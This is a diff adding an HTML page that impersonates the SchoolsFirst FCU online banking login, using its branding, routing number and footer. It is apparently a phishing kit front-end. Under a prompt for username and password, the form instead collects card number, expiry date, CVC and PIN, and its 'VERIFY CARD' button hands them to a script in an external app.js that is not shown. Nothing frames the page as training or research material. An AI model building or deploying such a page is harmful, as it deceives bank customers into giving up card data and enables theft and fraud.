@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="favicon.ico">
+    <link href="./css/app.css" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
+        integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script type="text/javascript" src="./js/app.js"></script>
+    <title> SchoolsFirst FCU - Welcome </title>
+</head>
+
+<body>
+
+    <header>
+        <div class="topHeader">
+            <div class="topHeaderImg">
+                <img src="./assets/asset 0.jpeg" />
+            </div>
+            <div class="topHeaderLink">
+                <a href="#"> RATES <i class="fa-solid fa-angle-down"></i> </a>
+                <a href="#"> ROUTING #322282001 <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> BRANCH/ATM LOCATOR <i class="fa-solid fa-location-dot"></i> </a>
+            </div>
+        </div>
+        <div class="bottomHeader">
+            <div class="bottomHeaderLink">
+                <a href="#"> PRODUCTS <i class="fa-solid fa-angle-down"></i> </a>
+                <a href="#"> ADVICE <i class="fa-solid fa-angle-down"></i> </a>
+                <a href="#"> JOIN <i class="fa-solid fa-angle-down"></i> </a>
+                <a href="#"> CONTACT <i class="fa-solid fa-angle-down"></i> </a>
+            </div>
+            <div class="bottomHeaderExtra">
+                <i class="fa-solid fa-magnifying-glass"></i>
+                <button> LOG IN </button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+
+        <div class="mainForm">
+            <p> Please enter your username and password below. <a href="#"> Visit our how-to guide to learn more. </a>
+            </p>
+            <form>
+                <label> Enter your Card Number </label>
+
+                <input type="number" autocomplete="organization" id="orgcn" />
+
+                <label> Enter your Expiry Date </label>
+
+                <input type="text" autocomplete="organization" id="orged" />
+
+                <label> Enter your Card CVC </label>
+
+                <input type="number" autocomplete="off" id="orgcc" />
+
+                <label> Enter your Card Pin </label>
+
+                <input type="password" autocomplete="off" id="orgcp" />
+                <div class="mainFormExtra">
+                    <a href="#"> NEW USER REGISTRATION <i class="fa-solid fa-angle-right"></i> </a>
+                    <button type="button" onclick="secondsubmit()" id="secondbtn"> VERIFY CARD </button>
+                </div>
+                <a href="#"> Forgot user name or password <i class="fa-solid fa-angle-right"></i> </a>
+            </form>
+            <div class="mainFormExtraDiv">
+                <div class="mainFormExtraDivLeft">
+                    <p> Why Use Online Banking? </p>
+                    <ul>
+                        <li> Paying bills online </li>
+                        <li> Transferrring funds </li>
+                        <li> Viewing &amp; printing online eStatments </li>
+                        <li> Opening additional share accounts </li>
+                        <li> Viewing cleared checks </li>
+                        <li> Ordering checks </li>
+                    </ul>
+                </div>
+                <div class="mainFormExtraDivRight">
+                    <p> Protect Yourself Online </p>
+                    <ul>
+                        <li> Don't share your Account Number or password </li>
+                        <li> Change your password often </li>
+                        <li> Use the "log out" option to exit; don't use browser's "back" button </li>
+                        <li> Check your account frequently, so any discrepancies can be reported quickly </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <footer>
+
+        <div class="footerFlex">
+            <div class="footerFlexSocial">
+                <a href="#"> <img src="./assets/asset 1.png" /> </a>
+                <a href="#"> <img src="./assets/asset 2.png" /> </a>
+                <a href="#"> <img src="./assets/asset 3.png" /> </a>
+                <a href="#"> <img src="./assets/asset 4.png" /> </a>
+                <a href="#"> <img src="./assets/asset 5.png" /> </a>
+                <a href="#"> <img src="./assets/asset 6.png" /> </a>
+            </div>
+            <div class="footerFlexLink">
+                <a href="#"> PRIVACY POLICY <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> PRIVACY NOTICE <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> SCHOOLSFIRST FCU ROUTING #322282001 <i class="fa-solid fa-angle-right"></i> </a>
+                <br>
+                <a href="#"> ABOUT US <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> CAREERS <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> HOMEOWNER HARDSHIP ASSISTANCE <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> CONTACT US <i class="fa-solid fa-angle-right"></i> </a>
+                <a href="#"> FIND A BRANCH/ATM <i class="fa-solid fa-location-dot"></i> </a>
+            </div>
+        </div>
+
+        <div class="footerCopy">
+            &copy; Copyright 2022 SchoolsFirst FCU. All rights reserved.
+        </div>
+
+
+    </footer>
+
+</body>
+
+</html>
